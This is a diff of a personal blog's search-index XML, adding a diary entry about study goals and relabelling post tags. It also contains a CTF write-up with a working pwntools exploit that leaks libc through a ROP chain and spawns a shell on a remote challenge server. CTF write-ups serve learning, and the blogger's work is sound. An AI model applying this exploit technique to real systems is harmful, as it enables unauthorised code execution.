@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>2021.01.14</title>
+      <link href="2021/01/14/2021-01-14/"/>
+      <url>2021/01/14/2021-01-14/</url>
+      
+        <content type="html"><![CDATA[<h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>​        无论是学习还是生活，我发现自己很难去把握一个适当的度去平衡它们，当然还有情感。我本身是很敏感，容易焦虑的，这点在我与他人的交往中得到了多次印证，所以看了很多如何独处的文章，说白了就是给自己安全感。我要学会将重心偏向自己希望的其他事。爱你十分，表现七分，剩下的用来做其他事。</p><p>​        从前羡慕像太阳一样热情，温暖的人，不过发现自己并不能做到。现在就做像月亮一样的人吧！闪耀，温柔，不那么刺眼。</p><h1 id="修行"><a href="#修行" class="headerlink" title="修行"></a>修行</h1><p>为了追求更高的殿堂，打好基石。有关学习的心得总结我会更新在博客中</p><p><strong>闭关：</strong></p><ul><li><p>HWS硬件安全</p><blockquote><p>希望能冲一波线下。</p></blockquote></li><li><p>天问之路</p><blockquote><p>敢敢师傅的推荐。</p></blockquote></li><li><p>CASPP+Labs</p><blockquote><p>终究是逃不过，不过也好，程序员的圣经。</p></blockquote></li><li><p>Leetcode中等题</p><blockquote><p>说实话，我实在是不想动算法，希望我没事。</p></blockquote></li><li><p>Pwnable.tw  top 100</p><blockquote><p>终于要来了！早就想刷了。</p></blockquote></li><li><p>SGI +STL</p><blockquote><p> C++的库</p></blockquote></li></ul><p><strong>番外：</strong></p><ul><li><p>Docker</p><blockquote><p>heap的调试中是用的上的。而且其应用广泛，很有学习必要！</p></blockquote></li><li><p>HTML+CSS</p><blockquote><p>为了设计一个令我满意的网页，为了建站做准备。</p></blockquote></li><li><p>Git</p><blockquote><p>目前不太了解这是一个什么样的技术，不过作为一个Coder，GitHub肯定是必要的。</p></blockquote></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> -life -Broken thoughts </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> -life -Broken thoughts -About myself </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>HWS</title>
       <link href="2021/01/13/HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/"/>
       <url>2021/01/13/HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/</url>
@@ -13,18 +38,14 @@
       
       <categories>
           
-          <category> CTF-PWN </category>
-          
-          <category> IoT </category>
+          <category> -PWN -IoT </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> CTF-PWN </tag>
-            
-            <tag> IoT </tag>
+            <tag> -PWN -IoT </tag>
             
         </tags>
       
@@ -42,14 +63,14 @@
       
       <categories>
           
-          <category> CTF-PWN </category>
+          <category> PWN </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> CTF-PWN </tag>
+            <tag> -PWN -CTF </tag>
             
         </tags>
       
@@ -67,14 +88,14 @@
       
       <categories>
           
-          <category> About me </category>
+          <category> -life -Broken thoughts </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> life </tag>
+            <tag> -life -Broken thoughts -About myself </tag>
             
         </tags>
       
@@ -92,14 +113,14 @@
       
       <categories>
           
-          <category> CTF-PWN </category>
+          <category> PWN </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> CTF-PWN </tag>
+            <tag> -PWN -CTF </tag>
             
         </tags>
       
@@ -112,19 +133,19 @@
       <link href="2020/11/08/Lilac-mid-autum-fun/"/>
       <url>2020/11/08/Lilac-mid-autum-fun/</url>
       
-        <content type="html"><![CDATA[<h1 id="Lilac"><a href="#Lilac" class="headerlink" title="Lilac"></a>Lilac</h1><blockquote><p> HIT本部的ctf战队Liac的中秋活动，只有三道PWN。</p></blockquote><h1 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/giantbranch/Desktop/pwn/mid-autum-fun1/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h2 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h2><p><img src="/2020/11/08/Lilac-mid-autum-fun/CTF\writeup\图片\Liac-middleautumn-pwn1-ida1.png" alt></p><p><img src="/2020/11/08/Lilac-mid-autum-fun/CTF\writeup\图片\Liac-middleautumn-pwn1-ida2.png" alt></p><p>向v7中写入v6大小的数据，遇到回车结束。v6就是我们用alloca在栈上申请的大小。</p><p>为了保证v6大小能让我们完整的写入payload所以这里给它一个很大的数，“-31”，反正我们不用把所有的申请空间填满。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level=<span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">libc1=cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line">offset=<span class="number">0x14</span><span class="number">-3</span>+<span class="number">8</span><span class="number">-1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">&#x27;47.94.239.235&#x27;</span>,<span class="number">3001</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#guess number</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span>():</span></span><br><span class="line">libc1.srand(<span class="number">0X91D</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">66</span>):</span><br><span class="line">    num=str(libc1.rand())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;guess next number :&quot;</span>,num)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">guess()</span><br><span class="line">p.recvuntil(<span class="string">&quot;size of you name :&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;-31&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x0000000000400b53</span></span><br><span class="line">main=<span class="number">0x000000000040099C</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*offset+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">libcbase=puts_addr<span class="number">-0x06f6a0</span></span><br><span class="line">system=libcbase+<span class="number">0x0453a0</span></span><br><span class="line">bin_sh=libcbase+<span class="number">0x18ce17</span></span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line"></span><br><span class="line">guess()</span><br><span class="line">p.recvuntil(<span class="string">&quot;size of you name :&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;-31&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*offset+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>题目不难，这里主要介绍两个工具</p><p><strong>gdb.attach(p)</strong>：这个命令可以让你在执行脚本的时候再为你开启一个终端，供你进行动态调试。这样我们就可以知道自己的脚本在哪一步出了问题。<strong><del>强推</del></strong></p><p><strong>libc database search</strong>：LibcSearch虽然感觉很方便，但是它的libc库不算全，这个工具可以让你通过最后三位的偏移确定libc的版本。</p><h1 id="PWN2"><a href="#PWN2" class="headerlink" title="PWN2"></a>PWN2</h1><h1 id="PWN3"><a href="#PWN3" class="headerlink" title="PWN3"></a>PWN3</h1>]]></content>
+        <content type="html"><![CDATA[<h1 id="Lilac"><a href="#Lilac" class="headerlink" title="Lilac"></a>Lilac</h1><blockquote><p> HIT本部的ctf战队Lilac的中秋活动，只有三道PWN。</p></blockquote><h1 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/giantbranch/Desktop/pwn/mid-autum-fun1/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h2 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h2><p><img src="/2020/11/08/Lilac-mid-autum-fun/CTF\writeup\图片\Liac-middleautumn-pwn1-ida1.png" alt></p><p><img src="/2020/11/08/Lilac-mid-autum-fun/CTF\writeup\图片\Liac-middleautumn-pwn1-ida2.png" alt></p><p>向v7中写入v6大小的数据，遇到回车结束。v6就是我们用alloca在栈上申请的大小。</p><p>为了保证v6大小能让我们完整的写入payload所以这里给它一个很大的数，“-31”，反正我们不用把所有的申请空间填满。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level=<span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">libc1=cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line">offset=<span class="number">0x14</span><span class="number">-3</span>+<span class="number">8</span><span class="number">-1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">&#x27;47.94.239.235&#x27;</span>,<span class="number">3001</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#guess number</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span>():</span></span><br><span class="line">libc1.srand(<span class="number">0X91D</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">66</span>):</span><br><span class="line">    num=str(libc1.rand())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;guess next number :&quot;</span>,num)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">guess()</span><br><span class="line">p.recvuntil(<span class="string">&quot;size of you name :&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;-31&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x0000000000400b53</span></span><br><span class="line">main=<span class="number">0x000000000040099C</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*offset+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">libcbase=puts_addr<span class="number">-0x06f6a0</span></span><br><span class="line">system=libcbase+<span class="number">0x0453a0</span></span><br><span class="line">bin_sh=libcbase+<span class="number">0x18ce17</span></span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line"></span><br><span class="line">guess()</span><br><span class="line">p.recvuntil(<span class="string">&quot;size of you name :&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;-31&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*offset+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>题目不难，这里主要介绍两个工具</p><p><strong>gdb.attach(p)</strong>：这个命令可以让你在执行脚本的时候再为你开启一个终端，供你进行动态调试。这样我们就可以知道自己的脚本在哪一步出了问题。<strong><del>强推</del></strong></p><p><strong>libc database search</strong>：LibcSearch虽然感觉很方便，但是它的libc库不算全，这个工具可以让你通过最后三位的偏移确定libc的版本。</p><h1 id="PWN2"><a href="#PWN2" class="headerlink" title="PWN2"></a>PWN2</h1><h1 id="PWN3"><a href="#PWN3" class="headerlink" title="PWN3"></a>PWN3</h1>]]></content>
       
       
       <categories>
           
-          <category> CTF-PWN </category>
+          <category> PWN </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> CTF-PWN </tag>
+            <tag> -PWN -CTF </tag>
             
         </tags>
       
@@ -142,14 +163,14 @@
       
       <categories>
           
-          <category> CTF-PWN </category>
+          <category> PWN </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> CTF-PWN </tag>
+            <tag> -PWN -CTF </tag>
             
         </tags>
       
@@ -192,14 +213,14 @@
       
       <categories>
           
-          <category> CTF-PWN </category>
+          <category> PWN </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> CTF-PWN </tag>
+            <tag> -PWN -CTF </tag>
             
         </tags>
       
@@ -217,14 +238,14 @@
       
       <categories>
           
-          <category> About me </category>
+          <category> -life -Broken thoughts </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> life </tag>
+            <tag> -life -Broken thoughts -About myself </tag>
             
         </tags>
       
@@ -242,14 +263,14 @@
       
       <categories>
           
-          <category> CTF-PWN </category>
+          <category> -PWN -Linux </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> CTF-PWN </tag>
+            <tag> -PWN -CTF -Linux </tag>
             
         </tags>
       
@@ -267,14 +288,14 @@
       
       <categories>
           
-          <category> CTF-PWN </category>
+          <category> -PWN -Assembly </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> CTF-PWN </tag>
+            <tag> -PWN -CTF </tag>
             
         </tags>
       
@@ -292,14 +313,14 @@
       
       <categories>
           
-          <category> CTF-PWN </category>
+          <category> -PWN -Assembly </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> CTF-PWN </tag>
+            <tag> -PWN -CTF </tag>
             
         </tags>
       
@@ -317,14 +338,14 @@
       
       <categories>
           
-          <category> CTF-PWN </category>
+          <category> -PWN -Assembly </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> CTF-PWN </tag>
+            <tag> -PWN -CTF </tag>
             
         </tags>
       
@@ -342,14 +363,14 @@
       
       <categories>
           
-          <category> CTF-PWN </category>
+          <category> PWN </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> CTF-PWN </tag>
+            <tag> -PWN -CTF </tag>
             
         </tags>
       
@@ -367,14 +388,14 @@
       
       <categories>
           
-          <category> CTF-PWN </category>
+          <category> PWN </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> CTF-PWN </tag>
+            <tag> -PWN -CTF </tag>
             
         </tags>
       
@@ -392,14 +413,14 @@
       
       <categories>
           
-          <category> CTF-PWN </category>
+          <category> PWN </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> CTF-PWN </tag>
+            <tag> -PWN -CTF </tag>
             
         </tags>
       
@@ -408,7 +429,7 @@
     
     
     <entry>
-      <title>攻防世界-ROP(1)</title>
+      <title>攻防世界-刷题</title>
       <link href="2020/10/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ROP-1/"/>
       <url>2020/10/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ROP-1/</url>
       
@@ -417,14 +438,14 @@
       
       <categories>
           
-          <category> CTF-PWN </category>
+          <category> PWN </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> CTF-PWN </tag>
+            <tag> -PWN -CTF </tag>
             
         </tags>
       
@@ -487,19 +508,19 @@
       <link href="2020/09/27/hello-world/"/>
       <url>2020/09/27/hello-world/</url>
       
-        <content type="html"><![CDATA[<h1 id="This-is-my-first-note"><a href="#This-is-my-first-note" class="headerlink" title="This is my first  note."></a>This is my first  note.</h1><blockquote><p>BY Niebelungen-D</p></blockquote><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome!!!"></a>Welcome!!!</h2><p>Hello strangers!  </p><h4 id="I-like-code"><a href="#I-like-code" class="headerlink" title="I like code !"></a>I like code !</h4><h4 id="I-like-games"><a href="#I-like-games" class="headerlink" title="I like games !"></a>I like <strong>games</strong> !</h4><h3 id="I-like-anime"><a href="#I-like-anime" class="headerlink" title="I like anime !"></a>I like anime !</h3><h3 id="I-want-to-record-every-progress-I-make"><a href="#I-want-to-record-every-progress-I-make" class="headerlink" title="I want to record every progress I make."></a>I want to record every progress I make.</h3><blockquote><p><strong>The best thing in the world is working for what you like. No mater what others think, it is worth my effort. There are some things have nothings to do with money, good or bad, just because I like it.</strong></p></blockquote><h3 id="Hope-you-like-it-My-friends"><a href="#Hope-you-like-it-My-friends" class="headerlink" title="Hope you like it ! My friends !"></a>Hope you like it ! My friends !</h3>]]></content>
+        <content type="html"><![CDATA[<h1 id="This-is-my-first-note"><a href="#This-is-my-first-note" class="headerlink" title="This is my first  note."></a>This is my first  note.</h1><blockquote><p>BY Niebelungen</p></blockquote><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome!!!"></a>Welcome!!!</h2><p>Hello strangers!  </p><h4 id="I-like-code"><a href="#I-like-code" class="headerlink" title="I like code !"></a>I like code !</h4><h4 id="I-like-games"><a href="#I-like-games" class="headerlink" title="I like games !"></a>I like <strong>games</strong> !</h4><h3 id="I-like-anime"><a href="#I-like-anime" class="headerlink" title="I like anime !"></a>I like anime !</h3><h3 id="I-want-to-record-every-progress-I-make"><a href="#I-want-to-record-every-progress-I-make" class="headerlink" title="I want to record every progress I make."></a>I want to record every progress I make.</h3><blockquote><p><strong>The best thing in the world is working for what you like. No mater what others think, it is worth my effort. There are some things have nothings to do with money, good or bad, just because I like it.</strong></p></blockquote><h3 id="Hope-you-like-it-My-friends"><a href="#Hope-you-like-it-My-friends" class="headerlink" title="Hope you like it ! My friends !"></a>Hope you like it ! My friends !</h3>]]></content>
       
       
       <categories>
           
-          <category> hello </category>
+          <category> -life </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> hello-world </tag>
+            <tag> -Hello world -About me </tag>
             
         </tags>
       
